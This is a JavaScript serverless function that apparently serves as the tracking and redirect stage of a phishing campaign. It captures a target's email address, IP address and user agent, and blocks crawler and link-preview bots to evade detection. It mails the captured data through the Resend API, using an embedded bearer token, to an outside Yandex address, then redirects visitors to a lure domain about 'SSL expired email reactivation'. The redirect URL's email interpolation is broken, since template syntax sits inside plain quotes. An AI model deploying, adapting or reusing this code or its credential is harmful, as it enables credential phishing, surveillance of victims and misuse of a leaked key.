export async function onRequestGet(context) {
  const { searchParams } = new URL(context.request.url);
  const email = searchParams.get("email") || "unknown";
  const ip = context.request.headers.get("CF-Connecting-IP") || "unknown";
  const ua = context.request.headers.get("User-Agent") || "unknown";

  const redirectUrl = "https://sslexpiredemailreactivation.pages.dev?email=${encodeURIComponent(email)}"; // Replace this

  // Basic bot detection
  const knownBots = ["Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "facebookexternalhit", "Twitterbot", "Slackbot"];
  const isBot = knownBots.some(bot => ua.includes(bot)) || ua === "unknown";

  if (isBot) {
    return new Response("Bot access denied", { status: 403 });
  }

  // Send alert via Resend (or other)
  await fetch("https://api.resend.com/emails", {
    method: "POST",
    headers: {
      Authorization: "Bearer re_eNSzZu5P_DPFQQSeHRStRJ1JUstDqWNdG",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      from: "no-reply@on.resend.dev",
      to: "benitocalvin@yandex.com",
      subject: "🔔 Link Clicked",
      text: `Email: ${email}\nIP: ${ip}\nUA: ${ua}\nTime: ${new Date().toISOString()}`,
    }),
  });

  // Safe redirect only if human
  return Response.redirect(redirectUrl, 302);
}
